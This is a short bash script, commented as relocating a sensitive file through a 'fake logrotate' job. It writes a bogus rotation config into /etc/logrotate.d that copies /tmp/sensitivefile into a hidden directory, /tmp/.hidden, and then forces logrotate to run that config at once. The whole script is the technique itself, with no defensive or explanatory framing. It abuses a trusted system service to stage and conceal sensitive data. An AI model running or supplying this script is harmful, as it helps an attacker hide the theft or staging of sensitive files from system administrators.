#!/bin/bash
# Relocates a sensitive file via fake logrotate

cat <<EOF > /etc/logrotate.d/fakejob
/tmp/sensitivefile {
    copy
    olddir /tmp/.hidden
    rotate 1
    daily
}
EOF

logrotate -f /etc/logrotate.d/fakejob
